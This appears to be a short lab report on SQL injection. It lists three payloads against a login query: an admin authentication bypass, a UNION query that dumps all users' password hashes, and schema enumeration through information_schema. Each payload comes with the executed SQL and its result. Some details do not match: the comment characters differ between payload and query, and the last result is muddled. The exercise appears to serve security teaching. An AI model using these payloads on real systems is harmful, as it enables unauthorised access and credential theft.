Part A - Attacks

1. Authentication Bypass
Payload: admin' -- 
SQL ran: SELECT username, password FROM users WHERE username = 'admin' -- ' AND password = SHA2('', 256)
Result: Logged in as admin with no password.

2. Data Exfiltration
Payload: ' UNION SELECT username, password FROM users -- 
SQL ran: SELECT username, password FROM users WHERE username = '' UNION SELECT username, password FROM users #' AND password = SHA2('', 256)
Result: Printed all 6 users and their password hashes.


3. Schema Discovery
Payload: ' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema = database() -- 
SQL ran: SELECT username, password FROM users WHERE username = '' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema = database() #' AND password = SHA2('', 256)
Result: Revealed the table name username and password.